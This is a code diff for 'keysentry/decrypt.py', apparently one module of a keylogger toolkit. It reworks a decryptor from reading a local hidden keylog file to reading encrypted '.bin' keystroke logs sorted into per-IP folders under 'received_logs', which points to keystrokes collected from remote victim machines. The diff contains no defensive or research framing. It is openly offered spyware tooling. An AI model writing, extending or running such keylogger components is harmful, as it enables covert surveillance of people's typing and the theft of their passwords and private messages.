@@ -1,35 +1,60 @@
-# Decrypts encrypted keylog.txt file using Fernet key
-# Outputs decrypted keystrokes with timestamps
+# keysentry/decrypt.py
+# CORRECTION: Reads file line-by-line to handle multiple log entries
 
 from cryptography.fernet import Fernet
-import base64
 import os
+import sys
 
-#  Step 1: Load the encryption key 
+# Load encryption key
 try:
     with open("key.key", "rb") as key_file:
         key = key_file.read()
     fernet = Fernet(key)
 except FileNotFoundError:
-    print("❌ key.key file not found. Run keygen.py first.")
-    exit(1)
+    print("❌ 'key.key' file not found. Run keygen.py first.")
+    sys.exit(1)
 
-#  Step 2: Read the encrypted log file 
-try:
-    with open(".keylog.txt", "rb") as log_file:
-        lines = log_file.readlines()
-except FileNotFoundError:
-    print("❌ keylog.txt not found. Run keylogger.py first.")
-    exit(1)
+# Check if user provided an IP/log directory
+if len(sys.argv) != 2:
+    print("Usage: python -m keysentry.decrypt <received_logs/IP_ADDRESS>")
+    sys.exit(1)
 
-#  Step 3: Decrypt and print logs 
-print("\n🔓 Decrypted Keylog Output:\n")
+log_dir = sys.argv[1]
 
-for i, line in enumerate(lines, 1):
+if not os.path.isdir(log_dir):
+    print(f"❌ Directory '{log_dir}' does not exist.")
+    sys.exit(1)
+
+log_files = sorted([f for f in os.listdir(log_dir) if f.endswith(".bin")])
+
+if not log_files:
+    print(f"❌ No '.bin' log files found in {log_dir}")
+    sys.exit(1)
+
+print(f"\n🔓 Decrypted Logs from: {log_dir}\n")
+
+# Decrypt each file
+for file_name in log_files:
+    file_path = os.path.join(log_dir, file_name)
+    print(f"--- File: {file_name} ---")
+    
     try:
-        # Decode from base64 then decrypt
-        encrypted = base64.b64decode(line.strip())
-        decrypted = fernet.decrypt(encrypted)
-        print(f"{i:03d}: {decrypted.decode()}")
+        with open(file_path, "rb") as f:
+            # READ LINE BY LINE (Fixes the crash)
+            lines = f.readlines()
+            
+        for line in lines:
+            line = line.strip() # Remove the \n
+            if not line:
+                continue
+            
+            try:
+                decrypted = fernet.decrypt(line).decode()
+                print(decrypted)
+            except Exception as e:
+                print(f"   [!] Error decrypting line: {e}")
+
     except Exception as e:
-        print(f"[!] Failed to decrypt line {i}: {e}")
+        print(f"[!] Failed to read file {file_name}: {e}")
+    
+    print("-" * 30)
